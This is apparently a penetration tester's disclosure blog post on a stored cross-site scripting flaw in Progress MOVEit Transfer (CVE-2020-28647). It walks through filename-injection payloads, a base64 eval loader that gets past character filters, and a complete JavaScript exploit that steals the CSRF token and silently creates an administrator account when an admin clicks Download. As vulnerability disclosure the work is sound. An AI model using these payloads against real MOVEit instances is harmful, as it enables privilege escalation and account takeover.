# Progress MOVEit Transfer < 2020.1 Stored XSS (CVE-2020-28647)




During a recent web application test engagement one of the applications in scope was a MOVEit Transfer 2020 web application. While performing the assessment a Stored Cross-Site Scripting (XSS) vulnerability was identified. This blog post will go though the discovery and exploitation of such vulnerability to gain administrative access to the web application.

While testing for input validation in a number of different input fields found across the application, one particular input field seemed to provide unexpected output when certain payloads where provided. This input field was the file name being uploaded. After uploading files with certain filenames, it was identified that then when trying to download the file, the download button was not performing any action. This behaviour was investigated and as we can see in the image below a JavaScript error is being triggered when clicking on the download button.

![](https://labs.secforce.com/uploads/1_js_error_initialfind.png)

Once this error was identified the HTML code behind the download button was analysed. From the initial analysis it resulted that the filename is being included in the button's `onclick` JavaScript function without being properly sanitized, as can be seen in the image below.

![](https://labs.secforce.com/uploads/2_js_error_intialfind_injectedfilename.png)

With this observation it was clear that JavaScript code can be injected that will be executed once a user clicks on the `Download` button. The first step was to create a Proof of Concept code that triggers a JavaScript popup via the `alert` function. Given the nature of the code and the place where the filename is being injected, the following payload was crafted. This payload would terminate the function being called and append a new function, `alert()`, followed by a dummy function to complete the code.

    test", 382,"1234");alert("XSS");a("test

With this payload in hand we can test this out. We can upload a file and then intercept the upload request to the server using burp proxy and change the filename and forward the request to the server.

![](https://labs.secforce.com/uploads/3_modifieduploadrequest.png)

![](https://labs.secforce.com/uploads/4_fileuploaded.png)

With the file being uploaded we can now open the file by clicking on the filename and then click on the `Download` button. Here we can see that XSS is triggered and a Javascript alert popup is shown.

![](https://labs.secforce.com/uploads/5_alert.png)

[![](https://img.youtube.com/vi/TS46qhgewSE/0.jpg)](https://www.youtube.com/watch?v=TS46qhgewSE)

Cool! So we can execute arbitrary Javascript code. What else can we do? Can we get something more out of this?

After going through the application and it's functionality, a potential vector of attack could be a low level user trying to escalate privileges to get administrative access to the web application.

The initial step was to check if it is possible to perform HTTP requests via Javascript by using `XMLHttpRequest`. While reviewing the settings for the file and folder names it was identified that MOVEit does not allow any file or folder to have `/` or `\` in the filename. So this can potentially prevent us from performing HTTP requests. Another limitation that was identified was that the filename is limited to 255 characters.

Based on this analysis we have a couple of restrictions that need to be bypassed. The first one was to try and find a way to bypass the `/` and `\` character limitation and to try and include a Javascript file hosted on a remote server. To bypass this restriction we can encode the Javascript code we want to execute in `base64` format and then decode this in memory and execute via the `eval` function. The following code snippet does exactly that.

    t",1,"1");var e="BASE64 CODE";var d=atob(e);eval(d);a("t","t

With this code the first attempt was to inject a `<script>` tag with the source of the file set to an externally hosted file. The code snippet below was base64 encoded and then copied in the snippet above.

    var s=document.createElement("script");s.onload=function(){r();};s.src="http://XXX.XXX.XXX.XXX/t";document.head.appendChild(s);

When trying this another issue popped up, CSP. The web application was using a CSP that prevented the loading of external javascript files.

![](https://labs.secforce.com/uploads/7_csp_error.png)

![](https://labs.secforce.com/uploads/8_csp.png)

So, we cannot load external files and we cannot include JS code that exceeds 255 characters. What can we do now? We can try to abuse the functionality of MOVEit and use it to host our malicious Javascript file.

First we need to create the Javascript code that will make a `GET` request to the page responsible to adding a new user to the system and from here extract the CSRF token. The script will then need to do a `POST` request to create a new admin user including the CSRF token extracted in the request. Below is the code snippet that does this.

    //Exploit Title: MOVEit Transfer 2020 - Stored Cross-Site Scripting (XSS)
    //Exploit Author: Mark Galea (mark.galea@secforce.com)
    //Date: 05-08-2020
    
    function r(){	
        alert(1);
        var uri = "human.aspx?arg12=useradd";
        xhr = new XMLHttpRequest();	
        xhr.open("GET", uri, false);	
        xhr.send(null)
        if (xhr.status === 200)
        {
            responseBody = read_body(xhr);
            firstSubStr = responseBody.substring(responseBody.indexOf("csrftoken")+18);
            csrfToken = firstSubStr.substring(0, firstSubStr.indexOf('"'));
            if (csrfToken){
                var adduserUri = "/human.aspx";
                var body="csrftoken=" + csrfToken + "&transaction=useradd&arg02=0&arg12=useradd&arg01=sectest3&arg03=sectest3&arg04=test1%40secforce.com&arg11=0&arg05=30&Opt03=en&Opt02=20&opt05=1xFEHd%5DFhhVKJm&opt04=1&Arg08=%5B9%255Sj%29%2B4%2ChAUAY3&Arg09=%5B9%255Sj%29%2B4%2ChAUAY3&opt07=%2FHome%2F%5BUSERNAME%5D&Arg10=";
                xhr2 = new XMLHttpRequest();
                xhr2.open("POST", adduserUri, false);
                xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr2.send(body);
            }
        }
    }
    
    function read_body(xhr) {
        var data;
        if (!xhr.responseType || xhr.responseType === "text") {
            data = xhr.responseText;
        } else if (xhr.responseType === "document") {
            data = xhr.responseXML;
        } else if (xhr.responseType === "json") {
            data = xhr.responseJSON;
        } else {
            data = xhr.response;
        }
        return data;	
    }

The Javascript code above needs to be saved to a file and then uploaded to MOVEit. After the file is uploaded open the file details and click on the download button while intercepting the web requests with burp proxy. In the burp proxy logs there should be an entry for the direct download link for the file. This URL should be similar to this:

    https://<MOVEIT_URL>/download?arg01=file693187292&arg02=693313636

Having the direct download link we can now set this up to be included in the payload. This code below will create a script tag and set the source URL to the direct download link and finally insert the script tag in the page head tag and `onload` execute the `r()` function.

    var s=document.createElement("script");s.onload=function(){r();};s.src="/download?arg01=file693187292&arg02=693313636";document.head.appendChild(s);

Next step is to base64 encode the code snippet above:

    dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7cy5vbmxvYWQ9ZnVuY3Rpb24oKXtyKCk7fTtzLnNyYz0iL2Rvd25sb2FkP2FyZzAxPWZpbGU2OTMxODcyOTImYXJnMDI9NjkzMzEzNjM2Ijtkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHMpOw==

The next step is to inject this final XSS payload. To do this upload a file while intercepting the requests with burp proxy and modify the uploaded file name to the XSS payload below.

    t",1,"1");var e="dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7cy5vbmxvYWQ9ZnVuY3Rpb24oKXtyKCk7fTtzLnNyYz0iL2Rvd25sb2FkP2FyZzAxPWZpbGU2OTMxODcyOTImYXJnMDI9NjkzMzEzNjM2Ijtkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHMpOw==";var d=atob(e);eval(d);a("t","t

Once the file is uploaded, click on the uploaded file to open the details and click on the Download button to trigger the XSS and the creation of the admin user. A low level user can create this setup and if the uploaded file is downloaded by an administrative user then the low level user can get the administrator to unwittingly create an admin account.

[![](https://img.youtube.com/vi/sR-BVGkABuE/0.jpg)](https://www.youtube.com/watch?v=sR-BVGkABuE)

Timeline

* 05/08/2020 - Issue Reported
* 08/08/2020 - Issue Verified and fix to be included in next major release
* 16/11/2020 - <a href="https://community.progress.com/s/article/MOVEit-Transfer-Vulnerability-Nov-2020">Progress MOVEit Advisory Released</a>
* 17/11/2020 - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28647">CVE-2020-28647 Released</a>
